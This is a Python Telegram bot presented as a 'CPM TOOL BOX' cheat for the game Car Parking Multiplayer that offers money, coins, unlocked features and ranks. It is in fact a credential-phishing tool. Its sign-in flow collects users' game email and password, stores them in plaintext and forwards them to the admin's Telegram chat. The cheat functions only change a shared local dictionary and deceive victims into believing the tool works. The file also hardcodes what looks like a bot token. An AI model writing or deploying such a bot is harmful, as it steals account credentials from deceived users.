import logging
import sqlite3
import asyncio
import re
import os
import time
from datetime import datetime, timedelta
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc")
ADMIN_ID = 8694942406

# CPM Data
CPM_DATA = {
    'money': 48729000,
    'coins': 20400,
    'wins': 16,
    'losses': 0,
    'levels': 109,
    'wheels': 112,
    'animations': 42,
    'friends': 0,
    'id': 'VY704074',
    'rank': 'Legendary',
    'features': {
        'w16': False,
        'no_dmg': False,
        'smoke': False,
        'wheels': False,
        'fuel': False,
        'horns': False,
        'anims': False,
        'houses': False,
        'rank': False,
        'all_cars': False
    }
}

# Cache
cache = {}

def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, 
                       email TEXT, password TEXT, username TEXT)''')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_id ON licenci(id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_odobren ON licenci(odobren)')
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_database()

async def get_user_data(user_id):
    try:
        if user_id in cache:
            return cache[user_id]
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT data, odobren, email, password, username FROM licenci WHERE id = ?', (str(user_id),))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            cache[user_id] = result
            return result
    except Exception as e:
        logger.error(f"Database error: {e}")
    return None

async def update_user_data(user_id, data, odobren, email=None, password=None, username=None):
    try:
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if email and password and username:
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, ?, ?, ?, ?)', 
                          (str(user_id), data, odobren, email, password, username))
        else:
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, ?)', 
                          (str(user_id), data, odobren))
        
        conn.commit()
        conn.close()
        
        if user_id in cache:
            del cache[user_id]
    except Exception as e:
        logger.error(f"Database error: {e}")

async def delete_user(user_id):
    try:
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM licenci WHERE id = ?', (str(user_id),))
        conn.commit()
        conn.close()
        
        if user_id in cache:
            del cache[user_id]
    except Exception as e:
        logger.error(f"Database error: {e}")

# ============ COMMAND HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    username = user.username if user.username else "N/A"

    # Admin panel
    if user.id == ADMIN_ID:
        admin_text = (
            "**🛡️ CPM_AJHAN_BOT v5.0 - ADMIN PANEL**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👑 Welcome Admin!\n\n"
            "📊 Select an option:"
        )
        keyboard = [
            [InlineKeyboardButton("📋 User List", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑️ Remove User", callback_data="admin_remove_user")],
            [InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        await update.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # Check if user is approved
    result = await get_user_data(str(user.id))
    
    now = datetime.now()
    allowed = False
    email = ""

    if result:
        expiry_str = result[0]
        approved = result[1] if len(result) > 1 else 0
        email = result[2] if len(result) > 2 and result[2] else ""
        
        if approved == 1:
            if expiry_str == "forever":
                allowed = True
            else:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    if expiry_date > now:
                        allowed = True
                except ValueError:
                    allowed = False

    if not allowed:
        # Check if user has pending request
        result2 = await get_user_data(str(user.id))
        if result2 and result2[1] == 0:
            wait_msg = (
                "⏳ **Waiting for Approval**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "📧 Your data has been sent to admin.\n"
                "⏱️ Please wait **5-10 minutes**.\n"
                "━━━━━━━━━━━━━━━━━━━"
            )
            keyboard = [[InlineKeyboardButton("🔄 Check Status", callback_data="proveri_status")]]
            await update.message.reply_text(text=wait_msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return
        else:
            welcome_text = (
                "**CPM_AJHAN_BOT v5.0**\n"
                "bot\n\n"
                "---\n"
                "**CPM TOOL BOX v5.0**\n"
                "---\n"
                f"**WELCOME**\n"
                f"@{username}\n"
                f"ID {user.id}\n"
                f"{now.strftime('%d %b %Y • %I:%M %p')}\n\n"
                "- Sign in with your CPM credentials\n"
                "**05:10**\n\n"
                "**Sign In**"
            )
            
            keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
            await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

    # Show dashboard - WITHOUT Cars and Houses buttons
    dashboard_text = (
        "**CPM_AJHAN_BOT v5.0**\n"
        "bot\n\n"
        "---\n"
        "**DASHBOARD**\n"
        "---\n"
        "**ACCOUNT**\n"
        f"{email if email else 'senatkafkast@gmail.com'}\n"
        f"2best\n"
        f"ID {CPM_DATA['id']}\n"
        f"Rank: {CPM_DATA['rank']}\n\n"
        "**STATS**\n"
        f"${CPM_DATA['money']:,}\n"
        f"{CPM_DATA['coins']:,} coins\n"
        f"{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
        f"{CPM_DATA['levels']}/900 levels done ⭐\n"
        f"{CPM_DATA['wheels']} wheels\n"
        f"{CPM_DATA['animations']} animations\n"
        f"{CPM_DATA['friends']} friends\n\n"
        "- Select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("👑 Rank", callback_data="menu_rank")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_account")],
        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
    ]
    
    await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ============ MENU HANDLERS ============

async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Money menu - max $50M"""
    query = update.callback_query
    await query.answer()
    
    text = (
        "**💰 MONEY**\n\n"
        f"Max: $50,000,000\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Select amount or enter custom:"
    )
    
    keyboard = [
        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m")],
        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Coins menu - max 500K"""
    query = update.callback_query
    await query.answer()
    
    text = (
        "**🪙 COINS**\n\n"
        "Max: 500,000\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Select amount or enter custom:"
    )
    
    keyboard = [
        [InlineKeyboardButton("10K", callback_data="add_coins_10k"), InlineKeyboardButton("50K", callback_data="add_coins_50k"), InlineKeyboardButton("100K", callback_data="add_coins_100k")],
        [InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k")],
        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Features menu - samo UNLOCK ALL"""
    query = update.callback_query
    await query.answer()
    
    features = CPM_DATA['features']
    status = {
        'w16': '✅' if features['w16'] else '⬜',
        'no_dmg': '✅' if features['no_dmg'] else '⬜',
        'smoke': '✅' if features['smoke'] else '⬜',
        'wheels': '✅' if features['wheels'] else '⬜',
        'fuel': '✅' if features['fuel'] else '⬜',
        'horns': '✅' if features['horns'] else '⬜',
        'anims': '✅' if features['anims'] else '⬜',
        'houses': '✅' if features['houses'] else '⬜',
        'rank': '✅' if features['rank'] else '⬜',
        'all_cars': '✅' if features['all_cars'] else '⬜'
    }
    
    text = (
        "**⚡ FEATURES**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Select a feature or UNLOCK ALL:\n\n"
        f"{status['w16']} W16\n"
        f"{status['no_dmg']} No Dmg\n"
        f"{status['smoke']} Smoke\n"
        f"{status['wheels']} Wheels\n"
        f"{status['fuel']} Fuel\n"
        f"{status['horns']} Horns\n"
        f"{status['anims']} Anims\n"
        f"{status['houses']} Houses\n"
        f"{status['rank']} Rank\n"
        f"{status['all_cars']} All Cars\n"
        f"📊 Levels: {CPM_DATA['levels']}/900 ⭐"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def feature_unlock_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unlock all features"""
    query = update.callback_query
    await query.answer()
    
    # Unlock all features
    for key in CPM_DATA['features']:
        CPM_DATA['features'][key] = True
    
    CPM_DATA['levels'] = 900
    CPM_DATA['rank'] = 'Legendary ★'
    
    success_text = (
        "✅ **ALL FEATURES UNLOCKED!**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "✅ W16\n"
        "✅ No Dmg\n"
        "✅ Smoke\n"
        "✅ Wheels\n"
        "✅ Fuel\n"
        "✅ Horns\n"
        "✅ Anims\n"
        "✅ Houses\n"
        "✅ Rank\n"
        "✅ All Cars\n"
        "✅ Levels: 900/900\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🎉 All features are now active!"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
    await query.edit_message_text(text=success_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_rank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Rank menu"""
    query = update.callback_query
    await query.answer()
    
    text = (
        "**👑 RANK**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"Current rank: {CPM_DATA['rank']}\n\n"
        "Available ranks:"
    )
    
    keyboard = [
        [InlineKeyboardButton("⭐ Bronze", callback_data="rank_bronze")],
        [InlineKeyboardButton("⭐ Silver", callback_data="rank_silver")],
        [InlineKeyboardButton("⭐ Gold", callback_data="rank_gold")],
        [InlineKeyboardButton("⭐ Platinum", callback_data="rank_platinum")],
        [InlineKeyboardButton("⭐ Diamond", callback_data="rank_diamond")],
        [InlineKeyboardButton("⭐ Legendary ★", callback_data="rank_legendary")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔄 **Refreshing account...**", parse_mode='Markdown')
    await asyncio.sleep(0.5)
    await start(update, context)

async def sign_out(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    await delete_user(str(user.id))
    
    await query.edit_message_text("🚪 **Signed out successfully!**\n\nType /start to sign in again.", parse_mode='Markdown')

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['state'] = 'WAIT_EMAIL'

# ============ MONEY/COINS HANDLERS ============

async def handle_money_add(update: Update, context: ContextTypes.DEFAULT_TYPE, amount):
    query = update.callback_query
    await query.answer()
    
    CPM_DATA['money'] += amount
    await query.edit_message_text(
        f"✅ **${amount:,} added!**\n"
        f"💰 New balance: ${CPM_DATA['money']:,}",
        parse_mode='Markdown'
    )
    await asyncio.sleep(0.5)
    await menu_money(update, context)

async def handle_coins_add(update: Update, context: ContextTypes.DEFAULT_TYPE, amount):
    query = update.callback_query
    await query.answer()
    
    CPM_DATA['coins'] += amount
    await query.edit_message_text(
        f"✅ **{amount:,} coins added!**\n"
        f"🪙 New balance: {CPM_DATA['coins']:,}",
        parse_mode='Markdown'
    )
    await asyncio.sleep(0.5)
    await menu_coins(update, context)

# ============ MESSAGE HANDLER ============

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    text = update.message.text
    user = update.effective_user
    username = user.username if user.username else "N/A"

    logger.info(f"Message from {username}: {text} (state: {state})")

    # Custom Money
    if state == 'CUSTOM_MONEY':
        try:
            value = text.strip().lower()
            
            if value.endswith('m'):
                amount = int(float(value[:-1]) * 1000000)
            elif value.endswith('k'):
                amount = int(float(value[:-1]) * 1000)
            else:
                amount = int(value)
            
            if amount > 50000000:
                await update.message.reply_text("❌ Max is $50M!")
                return
            
            CPM_DATA['money'] += amount
            await update.message.reply_text(
                f"✅ **${amount:,} added!**\n"
                f"💰 New balance: ${CPM_DATA['money']:,}",
                parse_mode='Markdown'
            )
            
        except:
            await update.message.reply_text("❌ Enter valid number! Example: 10m, 500k, or 1000000")
        
        context.user_data['state'] = None
        return

    # Custom Coins
    if state == 'CUSTOM_COINS':
        try:
            value = text.strip().lower()
            
            if value.endswith('m'):
                amount = int(float(value[:-1]) * 1000000)
            elif value.endswith('k'):
                amount = int(float(value[:-1]) * 1000)
            else:
                amount = int(value)
            
            if amount > 500000:
                await update.message.reply_text("❌ Max is 500K coins!")
                return
            
            CPM_DATA['coins'] += amount
            await update.message.reply_text(
                f"✅ **{amount:,} coins added!**\n"
                f"🪙 New balance: {CPM_DATA['coins']:,}",
                parse_mode='Markdown'
            )
            
        except:
            await update.message.reply_text("❌ Enter valid number! Example: 100k or 50000")
        
        context.user_data['state'] = None
        return

    if state == 'WAIT_REMOVE_USER':
        try:
            target_user_id = int(text)
            
            result = await get_user_data(str(target_user_id))
            if not result:
                await update.message.reply_text("❌ User not found!")
                context.user_data['state'] = None
                return
            
            await delete_user(str(target_user_id))
            await update.message.reply_text(f"✅ **User {target_user_id} removed!**", parse_mode='Markdown')
            context.user_data['state'] = None
            
        except:
            await update.message.reply_text("❌ Enter valid ID!")
        return

    if state == 'WAIT_EMAIL':
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, text):
            await update.message.reply_text("❌ Enter valid email address!")
            return
        
        context.user_data['email'] = text
        msg = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
        keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
        
        await update.message.reply_text(text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        context.user_data['state'] = 'WAIT_PASSWORD'
        return

    if state == 'WAIT_PASSWORD':
        password = text
        email = context.user_data.get('email')
        context.user_data['state'] = None
        
        await update_user_data(str(user.id), "pending", 0, email, password, username)
        
        admin_msg = (
            f"🔐 **New Profile!**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{username}\n"
            f"🆔 `{user.id}`\n"
            f"📧 `{email}`\n"
            f"🔑 `{password}`\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard_admin = [
            [InlineKeyboardButton("✅ Approve", callback_data=f"lic:approve:{user.id}")],
            [InlineKeyboardButton("❌ Deny", callback_data=f"lic:deny:{user.id}")]
        ]
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_msg,
            reply_markup=InlineKeyboardMarkup(keyboard_admin),
            parse_mode='Markdown'
        )
        
        wait_msg = (
            "⏳ **Waiting for Approval**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📧 Data sent to admin.\n"
            "⏱️ Please wait **5-10 minutes**.\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard = [[InlineKeyboardButton("🔄 Check Status", callback_data="proveri_status")]]
        await update.message.reply_text(
            text=wait_msg,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return

    # Other messages - send to admin
    admin_msg = (
        f"📝 **User Message**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 @{username}\n"
        f"🆔 `{user.id}`\n"
        f"📩 {text}\n"
        f"⏰ {datetime.now().strftime('%H:%M')}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='Markdown')
    await update.message.reply_text("✅ **Message sent to admin!**", parse_mode='Markdown')

# ============ CALLBACK HANDLER ============

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    logger.info(f"Callback: {data} from {user.id}")

    # === MONEY ADD ===
    if data == "add_money_1m":
        await handle_money_add(update, context, 1000000)
        return
    if data == "add_money_5m":
        await handle_money_add(update, context, 5000000)
        return
    if data == "add_money_10m":
        await handle_money_add(update, context, 10000000)
        return
    if data == "add_money_25m":
        await handle_money_add(update, context, 25000000)
        return
    if data == "add_money_50m":
        await handle_money_add(update, context, 50000000)
        return

    # === COINS ADD ===
    if data == "add_coins_10k":
        await handle_coins_add(update, context, 10000)
        return
    if data == "add_coins_50k":
        await handle_coins_add(update, context, 50000)
        return
    if data == "add_coins_100k":
        await handle_coins_add(update, context, 100000)
        return
    if data == "add_coins_250k":
        await handle_coins_add(update, context, 250000)
        return
    if data == "add_coins_500k":
        await handle_coins_add(update, context, 500000)
        return

    # === CUSTOM ===
    if data == "custom_money":
        await query.edit_message_text(
            "💰 **Enter custom amount:**\n"
            "Example: 10m, 500k, or 1000000\n"
            "Max: $50M",
            parse_mode='Markdown'
        )
        context.user_data['state'] = 'CUSTOM_MONEY'
        return
    
    if data == "custom_coins":
        await query.edit_message_text(
            "🪙 **Enter custom amount:**\n"
            "Example: 100k or 50000\n"
            "Max: 500K",
            parse_mode='Markdown'
        )
        context.user_data['state'] = 'CUSTOM_COINS'
        return

    # === RANK ===
    rank_map = {
        "rank_bronze": "Bronze",
        "rank_silver": "Silver",
        "rank_gold": "Gold",
        "rank_platinum": "Platinum",
        "rank_diamond": "Diamond",
        "rank_legendary": "Legendary ★"
    }
    
    if data in rank_map:
        CPM_DATA['rank'] = rank_map[data]
        await query.edit_message_text(
            f"✅ **Rank changed to: {rank_map[data]}**",
            parse_mode='Markdown'
        )
        await asyncio.sleep(0.5)
        await menu_rank(update, context)
        return

    if data == "proveri_status":
        result = await get_user_data(str(user.id))
        
        if result and result[1] == 1:
            await query.edit_message_text("✅ **You are approved!** Type /start.", parse_mode='Markdown')
            return
        elif result and result[1] == 0:
            keyboard = [[InlineKeyboardButton("🔄 Check", callback_data="proveri_status")]]
            await query.edit_message_text(
                "⏳ **Waiting for approval...**\nWait 5-10 minutes.",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return
        else:
            await query.edit_message_text("❌ No request found. Type /start.", parse_mode='Markdown')
            return

    if data == "feature_unlock_all":
        await feature_unlock_all(update, context)
        return

    if data == "admin_panel":
        await start(update, context)
        return
    
    if data == "admin_list_users":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT id, username, data, odobren, email FROM licenci ORDER BY odobren DESC')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            await query.edit_message_text("📋 **No users found.**", parse_mode='Markdown')
            return
        
        text = "📋 **USER LIST**\n━━━━━━━━━━━━━━━━━━━\n\n"
        for user_data in users:
            user_id, username, data, odobren, email = user_data
            status = "✅ Active" if odobren == 1 else "⏳ Waiting"
            text += f"🆔 `{user_id}`\n👤 @{username or 'N/A'}\n📧 {email or 'None'}\n📅 {data or 'None'}\n📊 {status}\n━━━━━━━━━━━━━━━━━━━\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return
    
    if data == "admin_remove_user":
        await query.edit_message_text("🗑️ **Enter ID to remove:**\nExample: 8694942406", parse_mode='Markdown')
        context.user_data['state'] = 'WAIT_REMOVE_USER'
        return
    
    if data == "admin_stats":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM licenci')
        total = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 1')
        active = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 0')
        waiting = cursor.fetchone()[0]
        conn.close()
        
        text = (
            f"📊 **STATISTICS**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total: **{total}**\n"
            f"✅ Active: **{active}**\n"
            f"⏳ Waiting: **{waiting}**\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data.startswith("lic:"):
        parts = data.split(":")
        action = parts[1]
        target_id = int(parts[2])
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if action == "deny":
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_id),))
            conn.commit()
            conn.close()
            await context.bot.send_message(chat_id=target_id, text="❌ **You have been denied!**")
            await query.edit_message_text(f"❌ Denied user {target_id}")
            return
            
        elif action == "approve":
            cursor.execute('UPDATE licenci SET data = ?, odobren = 1 WHERE id = ?', 
                          ("forever", str(target_id)))
            cursor.execute('SELECT email, password, username FROM licenci WHERE id = ?', (str(target_id),))
            user_info = cursor.fetchone()
            conn.commit()
            conn.close()
            
            await context.bot.send_message(
                chat_id=target_id, 
                text="✅ **You are approved!** Type /start to enter."
            )
            
            if user_info:
                email, password, username = user_info
                admin_notify = (
                    f"✅ **User Approved!**\n"
                    f"👤 @{username or 'N/A'}\n"
                    f"🆔 {target_id}\n"
                    f"📧 {email or 'None'}\n"
                    f"📅 Forever"
                )
                await query.edit_message_text(admin_notify, parse_mode='Markdown')
            return

    # Menu navigation
    menu_handlers = {
        "menu_money": menu_money,
        "menu_coins": menu_coins,
        "menu_features": menu_features,
        "menu_rank": menu_rank,
        "refresh_account": refresh_account,
        "sign_out": sign_out,
        "main_menu": main_menu,
        "cpm_signin": cpm_signin,
    }
    
    if data in menu_handlers:
        await menu_handlers[data](update, context)
        return

# ============ KEEP-ALIVE THREAD ============

def keep_alive():
    """Keep the bot alive by pinging itself"""
    while True:
        time.sleep(300)  # Every 5 minutes
        logger.info("Bot is still alive...")

# ============ MAIN ============

def main():
    """Main function to run the bot"""
    # Start keep-alive thread
    keep_alive_thread = Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start bot
    logger.info("Bot started with keep-alive thread...")
    app.run_polling()

if __name__ == "__main__":
    main()
